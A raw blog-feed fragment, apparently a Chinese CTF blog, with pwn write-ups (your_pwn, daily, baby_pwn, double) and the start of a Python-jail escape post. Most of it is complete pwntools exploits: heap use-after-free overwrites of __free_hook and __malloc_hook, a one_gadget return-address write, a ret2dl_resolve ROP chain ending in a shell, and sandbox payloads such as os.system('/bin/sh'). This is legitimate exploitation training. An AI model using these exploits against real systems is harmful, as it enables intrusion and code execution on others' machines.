地址，最后用同样的方法再循环写入返回地址为</p><p>one_gadget即可；</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">#sh=process(&apos;./pwn&apos;)</span><br><span class="line">sh=remote(&apos;1b190bf34e999d7f752a35fa9ee0d911.kr-lab.com&apos;,&apos;57856&apos;)#(&apos;111.198.29.45&apos;,&apos;32440&apos;)</span><br><span class="line">elf = ELF(&apos;./pwn&apos;)</span><br><span class="line">sh.sendlineafter(&apos;name:&apos;,&apos;name&apos;)</span><br><span class="line"></span><br><span class="line">leak = &apos;&apos;</span><br><span class="line">def scan(idx):</span><br><span class="line">global leak</span><br><span class="line">sh.sendlineafter(&apos;index\n&apos;,str(idx))</span><br><span class="line">sh.recvuntil(&apos;(hex) &apos;)</span><br><span class="line">r = sh.recvuntil(&apos;\n&apos;,drop=True)[-2:]</span><br><span class="line">print r</span><br><span class="line">leak =r+leak</span><br><span class="line">l=int(r,16)</span><br><span class="line">sh.sendlineafter(&apos;value\n&apos;,str(l))</span><br><span class="line"></span><br><span class="line">for i in range(632,638):</span><br><span class="line">scan(i)</span><br><span class="line">leak=leak.ljust(8,&apos;\x00&apos;)</span><br><span class="line">print leak</span><br><span class="line">leak_addr = int(&apos;0x&apos;+leak,16)</span><br><span class="line">print hex(leak_addr)</span><br><span class="line"></span><br><span class="line">libc_start = leak_addr -240 </span><br><span class="line">print &apos;libc_start_main:&apos; + hex(libc_start)</span><br><span class="line">libc = leak_addr-elf.plt[&apos;__libc_start_main&apos;]-0x1ff20</span><br><span class="line">print hex(libc)</span><br><span class="line">#system = libc+ 0x045390</span><br><span class="line">#binsh = libc + 0x18cd57</span><br><span class="line">one = 0x4526a + libc</span><br><span class="line">print &apos;one: &apos;+ hex(one)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ls = [0,0,0,0,0,0,0,0]</span><br><span class="line">for i in range(0,8):</span><br><span class="line">ls[i] = one%0x100</span><br><span class="line">print hex(ls[i])</span><br><span class="line">one /= 0x100</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">for i in range(344,352):</span><br><span class="line">j=i-344</span><br><span class="line">print hex(ls[j])</span><br><span class="line">sh.sendlineafter(&apos;index\n&apos;,str(i))</span><br><span class="line">sh.sendlineafter(&apos;value\n&apos;,str(ls[j]))</span><br><span class="line">#sleep(2)</span><br><span class="line"></span><br><span class="line">#gdb.attach(sh,&apos;b* 0xc2a&apos;+str(libc))</span><br><span class="line">sh.sendlineafter(&apos;index\n&apos;,str(-1))</span><br><span class="line">sh.sendlineafter(&apos;value\n&apos;,str(1))</span><br><span class="line">sh.sendlineafter(&apos;? \n&apos;,&apos;no&apos;)</span><br><span class="line"></span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h1 id="daily"><a href="#daily" class="headerlink" title="daily"></a>daily</h1><p><em>做一半电脑死机了。。坑。。。</em></p><h2 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h2><p><em>漏洞点比较隐蔽，看了好久</em></p><p>关键函数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">unsigned __int64 remove()</span><br><span class="line">&#123;</span><br><span class="line">  int idx; // [rsp+Ch] [rbp-14h]</span><br><span class="line">  char buf; // [rsp+10h] [rbp-10h]</span><br><span class="line">  unsigned __int64 v3; // [rsp+18h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(0x28u);</span><br><span class="line">  if ( cnt )</span><br><span class="line">  &#123;</span><br><span class="line">    printf(&quot;Please enter the index of daily:&quot;);</span><br><span class="line">    read(0, &amp;buf, 8uLL);</span><br><span class="line">    idx = atoi(&amp;buf);</span><br><span class="line"></span><br><span class="line">    if ( *(_QWORD *)&amp;ptr[4 * idx + 2] )                 // 没有检查idx的大小</span><br><span class="line">    &#123;</span><br><span class="line">      free(*(void **)&amp;ptr[4 * idx + 2]);</span><br><span class="line">      *(_QWORD *)&amp;ptr[4 * idx + 2] = 0LL;</span><br><span class="line">      ptr[4 * idx] = 0;</span><br><span class="line">      puts(&quot;remove successful!!&quot;);</span><br><span class="line">      --cnt;</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">      puts(&quot;invaild index&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;No pages in the daily&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return __readfsqword(0x28u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h2><p>前面很容易想到利用malloc_consolidate 来泄露libc地址及heap地址；</p><p>而漏洞点在于在删除chunk时，没有对输入的idx进行检查，所以只要释放的地址处的chunk可以通过检查，就可以被置入bin链表中</p><p>而只要泄露堆地址，就可以运算得到其index，因为输入的是整型数据，所以在一定情况下堆分配离bss段较远时会出错，不过这个问题可以多次尝试来解决</p><p>所以在堆上伪造如同bss段的结构体(size+ptr)，delete时将idx指向这里free掉一个chunk，而因为这样并不会情况bss段存储的结构体，我们就可以UAF</p><p>最后因为尝试one_gadget条件无法满足，最后只能换成调用system函数来覆盖free_hook来getshell</p><h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh = process(&apos;./pwn&apos;)</span><br><span class="line">#sh = remote(&apos;5f0cfa41a052c741f4beafe9d083d281.kr - lab.com&apos;,58512)</span><br><span class="line">elf = ELF(&apos;./pwn&apos;)</span><br><span class="line">libc = ELF(&apos;/lib/x86_64-linux-gnu/libc-2.23.so&apos;)</span><br><span class="line"></span><br><span class="line">def add(size,con):</span><br><span class="line">    sh.recvuntil(&apos;Your choice:&apos;)</span><br><span class="line">    sh.sendline(&apos;2&apos;)</span><br><span class="line">    sh.recvuntil(&apos;daily:&apos;)</span><br><span class="line">    sh.sendline(str(size))</span><br><span class="line">    sh.recvuntil(&apos;daily\n&apos;)</span><br><span class="line">    sh.send(con)</span><br><span class="line">def dele(idx):</span><br><span class="line">    sh.recvuntil(&apos;choice:&apos;)</span><br><span class="line">    sh.sendline(&apos;4&apos;)</span><br><span class="line">    sh.recvuntil(&apos;daily:&apos;)</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line">def edit(idx,con):</span><br><span class="line">    sh.recvuntil(&apos;Your choice:&apos;)</span><br><span class="line">    sh.sendline(&apos;3&apos;)</span><br><span class="line">    sh.recvuntil(&apos;daily:&apos;)</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line">    sh.recvuntil(&apos;daily&apos;)</span><br><span class="line">    sh.send(con)</span><br><span class="line">def show():</span><br><span class="line">    sh.recvuntil(&apos;choice:&apos;)</span><br><span class="line">    sh.sendline(&apos;1&apos;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(0x20,&apos;a&apos;)</span><br><span class="line">add(0x800,&apos;a&apos;)</span><br><span class="line">add(0x10,&apos;a&apos;)</span><br><span class="line">dele(1)</span><br><span class="line">add(0x100,&apos;aaaaaa&apos;)</span><br><span class="line">show()</span><br><span class="line">sh.recvuntil(&apos;a&apos;*8)</span><br><span class="line">main_arena = u64(sh.recv(6).ljust(8,&apos;\x00&apos;)) - 0x548</span><br><span class="line"></span><br><span class="line">libc_base = main_arena - libc.symbols[&apos;__malloc_hook&apos;] - 0x10</span><br><span class="line">one_gadget = libc_base + libc.symbols[&apos;system&apos;]</span><br><span class="line">free_hook = libc_base + libc.symbols[&apos;__free_hook&apos;]</span><br><span class="line"></span><br><span class="line">edit(1,&apos;a&apos;*24)</span><br><span class="line">show()</span><br><span class="line">sh.recvuntil(&apos;a&apos;*24)</span><br><span class="line">heap = u64(sh.recv(4).ljust(8,&apos;\x00&apos;))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(0x700-8,&apos;aaa&apos;)</span><br><span class="line">add(0x10,&apos;aaa&apos;)</span><br><span class="line">add(0x10,&apos;aaa&apos;)</span><br><span class="line">dele(4)</span><br><span class="line">dele(5)</span><br><span class="line">index = (heap + 0x10 - 0x602060)/16</span><br><span class="line">payload = p64(0x100) + p64(heap + 0x830 + 0x10)</span><br><span class="line">edit(1,payload)</span><br><span class="line">dele(index)</span><br><span class="line"></span><br><span class="line">add(0x10,p64(0x602058))</span><br><span class="line">add(0x10,&apos;c&apos;)</span><br><span class="line">add(0x10,&apos;d&apos;)</span><br><span class="line">add(0x10,&apos;e&apos;)</span><br><span class="line"></span><br><span class="line">edit(7,p64(free_hook))</span><br><span class="line">edit(0,p64(one_gadget))</span><br><span class="line">edit(1,&apos;/bin/sh\x00&apos;)</span><br><span class="line">dele(1)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h1 id="baby-pwn"><a href="#baby-pwn" class="headerlink" title="baby_pwn"></a>baby_pwn</h1><h2 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h2><p>关键函数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ssize_t vuln()</span><br><span class="line">&#123;</span><br><span class="line">  char buf; // [esp+0h] [ebp-28h]</span><br><span class="line"></span><br><span class="line">  return read(0, &amp;buf, 0x100u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>保护<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure></p><h2 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h2><p>直接给了溢出，同时除了PIE保护全开，没有给libc，可以确定是ret2_dl_runtime_resolve</p><p>可以直接使用roputils库 ，在bss段伪造结构体 ，然后上脚本即可</p><h2 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">import sys</span><br><span class="line">import roputils</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">offset = 44</span><br><span class="line">readplt = 0x08048390</span><br><span class="line">bss = 0x0804a068</span><br><span class="line">vulFunc = 0x0804852d</span><br><span class="line"></span><br><span class="line">#p = process(&apos;./pwn&apos;)</span><br><span class="line">p = remote(&apos;da61f2425ce71e72c1ef02104c3bfb69.kr-lab.com&apos;,&apos;33865&apos;)</span><br><span class="line">rop = roputils.ROP(&apos;./pwn&apos;)</span><br><span class="line">addr_bss = rop.section(&apos;.bss&apos;)</span><br><span class="line"></span><br><span class="line"># step1 : write sh &amp; resolve struct to bss</span><br><span class="line">buf1 = &apos;a&apos; * offset #44</span><br><span class="line">buf1 += p32(readplt) + p32(vulFunc) + p32(0) + p32(addr_bss) + p32(100)</span><br><span class="line">p.send(buf1)</span><br><span class="line"></span><br><span class="line">buf2 =  rop.string(&apos;/bin/sh&apos;)</span><br><span class="line">buf2 += rop.fill(20, buf2)</span><br><span class="line">buf2 += rop.dl_resolve_data(addr_bss+20, &apos;system&apos;)</span><br><span class="line">buf2 += rop.fill(100, buf2)</span><br><span class="line">p.send(buf2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#step2 : use dl_resolve_call get system &amp; system(&apos;/bin/sh&apos;)</span><br><span class="line">buf3 = &apos;a&apos;*44 + rop.dl_resolve_call(addr_bss+20, addr_bss)</span><br><span class="line">p.send(buf3)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="double"><a href="#double" class="headerlink" title="double"></a>double</h1><p><em>其实很简单的一道题。。。结果当天没做出来。。过了一天，昨天睡觉前突然意识到怎么做。。。最后写出来用了不到20分钟！！难受</em></p><h2 id="题目-3"><a href="#题目-3" class="headerlink" title="题目"></a>题目</h2><p>程序使用链表来记录分配的chunk，删除时也就是链表的元素删除，所以当时会陷入对链表的问题的查找，而实际上问题不在这里</p><p>主要问题函数：</p><p>分配的new函数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">unsigned __int64 new()</span><br><span class="line">&#123;</span><br><span class="line">  int size; // [rsp+4h] [rbp-12Ch]</span><br><span class="line">  struc *ptr; // [rsp+8h] [rbp-128h]</span><br><span class="line">  struc *last; // [rsp+10h] [rbp-120h]</span><br><span class="line">  char *dest; // [rsp+18h] [rbp-118h]</span><br><span class="line">  char s2; // [rsp+20h] [rbp-110h]</span><br><span class="line">  unsigned __int64 v6; // [rsp+128h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(0x28u);</span><br><span class="line">  ptr = (struc *)malloc(0x18uLL);</span><br><span class="line">  if ( ptr )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Your data:&quot;);</span><br><span class="line">    size = get_str(&amp;s2, 0x100);</span><br><span class="line">    last = ptrStop;</span><br><span class="line">    if ( ptrStop &amp;&amp; !strcmp((const char *)ptrStop-&gt;chunk_ptr, &amp;s2) )</span><br><span class="line">    &#123;</span><br><span class="line">      ptr-&gt;idx = last-&gt;idx + 1;</span><br><span class="line">      ptr-&gt;size = last-&gt;size;</span><br><span class="line">      ptr-&gt;chunk_ptr = last-&gt;chunk_ptr;</span><br><span class="line">      ptr-&gt;next_chunk = 0LL;</span><br><span class="line">      last-&gt;next_chunk = (__int64)ptr;</span><br><span class="line">      ptrStop = ptr;</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">      dest = (char *)malloc(size + 1);</span><br><span class="line">      if ( !dest )</span><br><span class="line">      &#123;</span><br><span class="line">        puts(&quot;Malloc Failed, Error&quot;);</span><br><span class="line">        free(ptr);</span><br><span class="line">        return __readfsqword(0x28u) ^ v6;</span><br><span class="line">      &#125;</span><br><span class="line">      strncpy(dest, &amp;s2, size + 1);</span><br><span class="line">      ptr-&gt;size = size;</span><br><span class="line">      ptr-&gt;chunk_ptr = (__int64)dest;</span><br><span class="line">      ptr-&gt;next_chunk = 0LL;</span><br><span class="line">      if ( ptrStart )</span><br><span class="line">      &#123;</span><br><span class="line">        ptr-&gt;idx = last-&gt;idx + 1;</span><br><span class="line">        last-&gt;next_chunk = (__int64)ptr;</span><br><span class="line">      &#125;</span><br><span class="line">      else</span><br><span class="line">      &#123;</span><br><span class="line">        ptr-&gt;idx = 0;</span><br><span class="line">        ptrStart = (__int64)ptr;</span><br><span class="line">      &#125;</span><br><span class="line">      ptrStop = ptr;</span><br><span class="line">    &#125;</span><br><span class="line">    printf(&quot;Success, index: %d\n&quot;, (unsigned int)ptr-&gt;idx);</span><br><span class="line">    return __readfsqword(0x28u) ^ v6;</span><br><span class="line">  &#125;</span><br><span class="line">  puts(&quot;Malloc Failed,Error&quot;);</span><br><span class="line">  return __readfsqword(0x28u) ^ v6;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="分析-3"><a href="#分析-3" class="headerlink" title="分析"></a>分析</h2><p>这个程序的问题在于分配chunk时，会检查内容是否相同，如果相同的话，就不再多分配chunk，只会分配结构体 chunk然后将其中的指针指向已知的chunk，也就会出现两个指针指向同一个chunk，我们就可以UAF</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if ( ptrStop &amp;&amp; !strcmp((const char *)ptrStop-&gt;chunk_ptr, &amp;s2) )</span><br></pre></td></tr></table></figure><p>而其实这就已经是极大的漏洞了，利用这个洞完全可以泄露libc然后覆盖fd指针到malloc_hook， one_gadget 一把梭getshell</p><p><em>完全没必要总去想着控制链表指针什么的…费力不讨好</em></p><h2 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">#context.log_level = &apos;debug&apos;</span><br><span class="line"></span><br><span class="line">sh=process(&apos;./pwn&apos;)</span><br><span class="line">#sh=remote(&apos;&apos;)#(&apos;85c3e0fcae5e972af313488de60e8a5a.kr-lab.com&apos;,&apos;58512&apos;)#(&apos;111.198.29.45&apos;,&apos;32440&apos;)</span><br><span class="line">elf = ELF(&apos;./pwn&apos;)</span><br><span class="line"></span><br><span class="line">def show(idx):</span><br><span class="line">sh.sendlineafter(&apos;&gt; &apos;,&apos;2&apos;)</span><br><span class="line">sh.sendlineafter(&apos;index: &apos;,str(idx))</span><br><span class="line">def new(con):</span><br><span class="line">sh.sendlineafter(&apos;&gt; &apos;,&apos;1&apos;)</span><br><span class="line">sh.sendlineafter(&apos;data:\n&apos;,con)</span><br><span class="line"></span><br><span class="line">def edit(idx,con):</span><br><span class="line">        sh.sendlineafter(&apos;&gt; &apos;,&apos;3&apos;)</span><br><span class="line">        sh.sendlineafter(&apos;index: &apos;,str(idx))</span><br><span class="line">        sh.sendline(con)</span><br><span class="line"></span><br><span class="line">def dele(idx):</span><br><span class="line">        sh.sendlineafter(&apos;&gt; &apos;,&apos;4&apos;)</span><br><span class="line">        sh.sendlineafter(&apos;index: &apos;,str(idx))</span><br><span class="line"></span><br><span class="line">new(&apos;a&apos;*8)</span><br><span class="line">new(&apos;a&apos;*8)</span><br><span class="line">new(&apos;b&apos;*8)</span><br><span class="line">new(&apos;c&apos;*0x80)</span><br><span class="line">new(&apos;c&apos;*0x80)</span><br><span class="line">new(&apos;d&apos;*0x60)</span><br><span class="line">new(&apos;d&apos;*0x60)</span><br><span class="line"></span><br><span class="line">new(&apos;e&apos;*0x20)</span><br><span class="line"></span><br><span class="line">#----------------leak heap base------------------------------//没有必要， 所以其实可以更短</span><br><span class="line">dele(2)</span><br><span class="line">dele(0)</span><br><span class="line">show(1)</span><br><span class="line">heap = u64(sh.recvuntil(&apos;\n&apos;,drop=True).ljust(8,&apos;\x00&apos;))-0x60</span><br><span class="line">print hex(heap)</span><br><span class="line"></span><br><span class="line">new(&apos;d&apos;*8)</span><br><span class="line">new(&apos;a&apos;*8)</span><br><span class="line">#---------------leak libc base-----------------------------</span><br><span class="line">dele(3)</span><br><span class="line">show(4)</span><br><span class="line"></span><br><span class="line">libc = u64(sh.recvuntil(&apos;\n&apos;,drop=True).ljust(8,&apos;\x00&apos;))-88-0x3c4b20</span><br><span class="line">print hex(libc)</span><br><span class="line">one = libc+0x4526a</span><br><span class="line">print hex(one)</span><br><span class="line"></span><br><span class="line">new(&apos;c&apos;*0x80)</span><br><span class="line"></span><br><span class="line">#------------------hjack malloc_hook to getshell-----------</span><br><span class="line">dele(5)</span><br><span class="line">edit(6,p64(libc+0x3c4b20-0x33))</span><br><span class="line">new(&apos;d&apos;*0x60)</span><br><span class="line">new(&apos;a&apos;*0x13+p64(one)+p64(0)*9)</span><br><span class="line"></span><br><span class="line">sh.sendlineafter(&apos;&gt; &apos;,&apos;1&apos;)</span><br><span class="line">sh.sendline(&apos;end&apos;)</span><br><span class="line"></span><br><span class="line">#gdb.attach(sh)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;em&gt;太菜了，堆的题要么找不到洞，要么找不到好的思路，得加紧训练&lt;/em&gt;&lt;/p&gt;
&lt;h1 id=&quot;your-pwn&quot;&gt;&lt;a href=&quot;#your-pwn&quot; class=&quot;headerlink&quot; title=&quot;your_pwn&quot;&gt;&lt;/a&gt;your_pwn&lt;/h1&gt;&lt;h2
      
    
    </summary>
    
      <category term="pwn" scheme="http://siriuswhiter.tk/categories/pwn/"/>
    
    
      <category term="pwn" scheme="http://siriuswhiter.tk/tags/pwn/"/>
    
      <category term="stack" scheme="http://siriuswhiter.tk/tags/stack/"/>
    
      <category term="heap" scheme="http://siriuswhiter.tk/tags/heap/"/>
    
  </entry>
  
  <entry>
    <title>Escape from python-jail</title>
    <link href="http://siriuswhiter.tk/2019/04/08/escape-from-python-jail/"/>
    <id>http://siriuswhiter.tk/2019/04/08/escape-from-python-jail/</id>
    <published>2019-04-08T13:05:19.000Z</published>
    <updated>2019-05-09T07:55:50.603Z</updated>
    
    <content type="html"><![CDATA[<h1 id="python-沙盒"><a href="#python-沙盒" class="headerlink" title="python 沙盒"></a>python 沙盒</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>python沙盒逃逸其实就是如何通过绕过限制，拿到出题人或者安全运维人员不想让我们拿到的”危险函数”，或者绕过Python终端达到命令执行的效果。</p><p>从这个角度来讲，沙盒逃逸本身更像是偏web的东西，就像是sql注入在被过滤的剩余字符中通过骚操作来执行不该被执行的命令一样。</p><h2 id="关于查看目标主机是否为docker"><a href="#关于查看目标主机是否为docker" class="headerlink" title="关于查看目标主机是否为docker"></a>关于查看目标主机是否为docker</h2><ol><li>cat /proc/self/cgroup</li><li>mount -v</li></ol><h2 id="任意执行命令的一些函数和模块"><a href="#任意执行命令的一些函数和模块" class="headerlink" title="任意执行命令的一些函数和模块"></a>任意执行命令的一些函数和模块</h2><ol start="0"><li><strong>import</strong> 函数</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__import__(&apos;os&apos;).system(&apos;dir&apos;)</span><br></pre></td></tr></table></figure><ol><li>os 模块</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line"></span><br><span class="line">os.system(&quot;/bin/sh&quot;)</span><br><span class="line"></span><br><span class="line">os.popen(&quot;/bin/sh&quot;)</span><br></pre></td></tr></table></figure><p>很少不被禁，不然很容易被利用getshell<br>官方文档 <a href="https://docs.python.org/2/library/os.html" target="_blank" rel="noopener">https://docs.python.org/2/library/os.html</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import os</span><br><span class="line">&gt;&gt;&gt; 